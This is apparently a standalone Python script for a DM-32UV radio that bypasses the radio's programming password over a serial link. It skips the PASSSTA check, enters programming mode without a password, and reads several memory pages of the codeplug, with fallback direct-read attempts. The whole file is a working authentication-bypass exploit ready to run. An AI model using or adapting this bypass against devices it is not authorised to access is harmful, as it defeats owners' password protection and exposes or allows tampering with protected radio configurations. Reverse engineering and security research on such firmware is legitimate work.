#!/usr/bin/env python3
"""DM-32UV: Full bypass — skip PASSSTA, enter PROGRAM, read codeplug."""

import serial
import time
import sys

PORT = "/dev/ttyUSB0"
BAUD = 115200

def fresh():
    ser = serial.Serial(PORT, BAUD, timeout=2, bytesize=8, parity='N', stopbits=1)
    time.sleep(0.5)
    ser.reset_input_buffer()
    ser.reset_output_buffer()
    time.sleep(0.2)
    return ser

def tx(ser, data, label=""):
    if isinstance(data, str):
        data = data.encode('ascii')
    print(f"  TX [{label}]: {data.hex(' ').upper()}")
    ser.write(data)
    ser.flush()

def rx(ser, size=256, timeout=2):
    ser.timeout = timeout
    data = ser.read(size)
    if data:
        asc = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
        print(f"  RX ({len(data)}B): {data.hex(' ').upper()}  |{asc}|")
    else:
        print("  RX: (timeout)")
    return data

def rx_silent(ser, size=256, timeout=2):
    ser.timeout = timeout
    return ser.read(size)

def hexdump(data, prefix="  "):
    lines = []
    for i in range(0, len(data), 16):
        c = data[i:i+16]
        h = " ".join(f"{b:02X}" for b in c)
        a = "".join(chr(b) if 32 <= b < 127 else "." for b in c)
        lines.append(f"{prefix}{i:04X}: {h:<48s} |{a}|")
    return "\n".join(lines)

print("=" * 60)
print("DM-32UV FULL PASSWORD BYPASS")
print("  PSEARCH → SYSINFO → PROGRAM → mode02 → READ")
print("  (PASSSTA never sent — password check never triggered)")
print("=" * 60)

ser = fresh()

# Step 1: PSEARCH
print("\n[1] PSEARCH")
tx(ser, "PSEARCH", "PSEARCH")
time.sleep(0.15)
r = rx(ser, 8)
if not r or r[0] != 0x06:
    print("FAIL"); ser.close(); sys.exit(1)
print(f"    Model: {r[1:].decode('ascii', errors='replace')}")

# Drain any stray bytes
time.sleep(0.1)
ser.reset_input_buffer()

# Step 2: SYSINFO (skip PASSSTA!)
print("\n[2] SYSINFO (PASSSTA skipped!)")
tx(ser, "SYSINFO", "SYSINFO")
time.sleep(0.15)
r = rx(ser, 8)
if not r or r[0] != 0x06:
    print(f"SYSINFO failed: {r.hex(' ') if r else 'timeout'}"); ser.close(); sys.exit(1)
print("    ACK!")

# Drain
time.sleep(0.1)
ser.reset_input_buffer()

# Step 3: PROGRAM
print("\n[3] PROGRAM (no password ever sent!)")
tx(ser, "PROGRAM", "PROGRAM")
time.sleep(0.3)
r = rx(ser, 8, timeout=3)
if not r or r[0] != 0x06:
    print(f"PROGRAM failed: {r.hex(' ') if r else 'timeout'}"); ser.close(); sys.exit(1)
print("    *** PROGRAM ACK WITHOUT PASSWORD ***")

# Drain extra bytes
time.sleep(0.1)
stray = rx_silent(ser, 16, timeout=0.5)
if stray:
    print(f"    (drained {len(stray)} stray bytes: {stray.hex(' ').upper()})")
ser.reset_input_buffer()

# Step 4: Mode 02
print("\n[4] Mode 02 handshake")
tx(ser, b"\x02", "mode 02")
time.sleep(0.5)
r = rx(ser, 8, timeout=3)
if not r:
    print("    timeout — trying again")
    time.sleep(0.3)
    tx(ser, b"\x02", "mode 02 retry")
    time.sleep(0.5)
    r = rx(ser, 8, timeout=3)

if r and all(b == 0xFF for b in r):
    print(f"    {len(r)}x 0xFF — confirming...")
    tx(ser, b"\x06", "confirm")
    time.sleep(0.2)
    r2 = rx(ser, 4)
    if r2 and r2[0] == 0x06:
        print("    *** FULL PROGRAMMING MODE — NO PASSWORD ***\n")

        # READ test pages
        pages = [
            (0x000000, "page 0"),
            (0x001000, "page 1"),
            (0x002000, "page 2"),
            (0x010000, "page 16"),
            (0x020000, "page 32"),
        ]
        for addr, label in pages:
            print(f"  [READ {label} @ 0x{addr:06X}]")
            tx(ser, bytes([0x52,
                addr & 0xFF, (addr >> 8) & 0xFF, (addr >> 16) & 0xFF,
                0x00, 0x01]), f"READ 0x{addr:06X}")
            time.sleep(0.3)
            r = rx_silent(ser, 300, timeout=5)
            if r and r[0] == 0x57 and len(r) > 5:
                print(f"    READ OK! {len(r)-5} data bytes:")
                print(hexdump(r[5:min(len(r), 5+64)]))
            elif r:
                print(f"    Response: {r[:16].hex(' ').upper()}")
            else:
                print(f"    timeout")
            print()

        # Close with 0x45 (END)
        print("[END]")
        tx(ser, b"\x45", "END")
        time.sleep(0.2)
        rx(ser, 8)
    else:
        print("    confirm failed")
elif r:
    print(f"    Unexpected: {r.hex(' ').upper()}")
    print("    Trying direct read without mode 02...")
    # Some radios allow read directly after PROGRAM ACK
    print("\n[4alt] Direct READ")
    tx(ser, bytes([0x52, 0x00, 0x00, 0x00, 0x00, 0x01]), "READ 0x000000")
    time.sleep(0.3)
    r = rx(ser, 300, timeout=3)
    if r and r[0] == 0x57:
        print("    *** DIRECT READ WORKS ***")
        print(hexdump(r[5:min(len(r), 5+64)]))
else:
    print("    No response to mode 02")
    # Try direct read
    print("\n[4alt] Direct READ without mode 02")
    tx(ser, bytes([0x52, 0x00, 0x00, 0x00, 0x00, 0x01]), "READ 0x000000")
    time.sleep(0.3)
    r = rx(ser, 300, timeout=3)
    if r and r[0] == 0x57:
        print("    *** DIRECT READ WORKS ***")
        print(hexdump(r[5:min(len(r), 5+64)]))
    else:
        print("    Read also failed")

ser.close()
print("\nDone.")
